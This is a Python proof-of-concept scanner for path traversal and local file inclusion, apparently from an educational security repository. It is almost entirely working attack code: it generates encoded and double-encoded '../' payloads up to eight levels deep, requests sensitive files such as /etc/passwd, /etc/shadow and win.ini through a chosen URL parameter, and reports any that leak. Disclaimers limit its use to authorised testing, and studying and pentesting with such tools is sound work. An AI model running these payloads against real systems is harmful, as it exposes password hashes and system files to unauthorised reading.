#!/usr/bin/env python3
"""
Path Traversal / Local File Inclusion PoC
==========================================
Demonstrates directory traversal by requesting common sensitive files through
a user-controlled path or filename parameter and checking the response for
known file content signatures.

DISCLAIMER: For educational and research purposes only.
Only run against systems you own or have explicit written permission to test.
"""

import argparse
import sys

try:
    import requests
    from colorama import Fore, Style, init as colorama_init
except ImportError:
    sys.exit("Missing dependencies. Run: pip install -r requirements.txt")

sys.path.insert(0, str(__import__("pathlib").Path(__file__).resolve().parents[1]))
from utils import build_session  # noqa: E402

colorama_init(autoreset=True)

DISCLAIMER = (
    f"{Fore.YELLOW}[!] DISCLAIMER: This tool is for educational/research purposes only.\n"
    f"    Only use against systems you own or have explicit written permission to test.{Style.RESET_ALL}"
)

# ── Traversal sequences ──────────────────────────────────────────────────────

TRAVERSAL_SEQUENCES = [
    "../",
    "..\\",
    "....//",
    "....\\\\",
    "%2e%2e%2f",          # URL-encoded ../
    "%2e%2e/",
    "..%2f",
    "%2e%2e%5c",          # URL-encoded ..\
    "..%5c",
    "%252e%252e%252f",    # Double URL-encoded ../
    "..%c0%af",           # Unicode / overlong UTF-8
    "..%c1%9c",
]

# Target files and their expected content signatures
TARGET_FILES: list[tuple[str, str]] = [
    # (relative path from web root, content signature)
    ("etc/passwd",           "root:"),
    ("etc/shadow",           "root:"),
    ("etc/hostname",         ""),
    ("etc/hosts",            "localhost"),
    ("proc/version",         "Linux version"),
    ("windows/win.ini",      "[fonts]"),
    ("windows/system32/drivers/etc/hosts", "localhost"),
    ("boot.ini",             "[boot loader]"),
]

# Maximum number of ../ sequences to prepend.
# 8 levels covers most real-world web roots that sit inside deep directory trees
# (e.g. /var/www/html/app/public → 5 levels from /).
MAX_DEPTH = 8


def build_traversal_paths(target_file: str) -> list[str]:
    """Generate traversal strings for a target file at various depths."""
    paths: list[str] = []
    for seq in TRAVERSAL_SEQUENCES:
        for depth in range(1, MAX_DEPTH + 1):
            paths.append(seq * depth + target_file)
    return paths


def probe(
    session: requests.Session,
    url: str,
    param: str,
    traversal_path: str,
    signature: str,
    timeout: int,
) -> bool:
    """Send one traversal payload; return True if the signature is present."""
    try:
        resp = session.get(url, params={param: traversal_path}, timeout=timeout)
        body = resp.text

        # A non-200 or very short response is likely not interesting
        if resp.status_code != 200 or len(body) < 10:
            return False

        if signature and signature not in body:
            return False

        # If no signature, look for non-trivial non-HTML content returned
        if not signature and "<html" in body.lower():
            return False

        print(
            f"{Fore.RED}[+] Possible path traversal!\n"
            f"    Payload  : {traversal_path!r}\n"
            f"    Signature: {signature!r}\n"
            f"    Status   : {resp.status_code}\n"
            f"    Snippet  : {body[:200]!r}"
        )
        return True
    except requests.RequestException as exc:
        print(f"{Fore.YELLOW}[-] Request error: {exc}")
        return False


def main() -> None:
    parser = argparse.ArgumentParser(
        description="Path Traversal PoC – educational purposes only",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=__doc__,
    )
    parser.add_argument("--url",     required=True, help="Target URL, e.g. http://localhost/page?file=home.php")
    parser.add_argument("--param",   default="page", help="Parameter containing the file/path (default: page)")
    parser.add_argument("--cookies", default=None,  help="Session cookies, e.g. 'PHPSESSID=abc; security=low'")
    parser.add_argument("--timeout", type=int, default=10, help="Request timeout in seconds (default: 10)")
    args = parser.parse_args()

    print(DISCLAIMER)
    print(f"\n{Fore.CYAN}[*] Target : {args.url}")
    print(f"{Fore.CYAN}[*] Param  : {args.param}\n")

    session = build_session(args.cookies, user_agent="PathTraversal-PoC/1.0 (educational)")
    found = False

    for target_file, signature in TARGET_FILES:
        print(f"{Fore.CYAN}[*] Trying to read: {target_file}")
        paths = build_traversal_paths(target_file)
        for path in paths:
            if probe(session, args.url, args.param, path, signature, args.timeout):
                found = True
                break  # Move to next file once one working path is found

    print()
    if found:
        print(f"{Fore.RED}[!] Target may be vulnerable to path traversal / LFI.")
    else:
        print(f"{Fore.GREEN}[✓] No path traversal indicators found with tested payloads.")


if __name__ == "__main__":
    main()
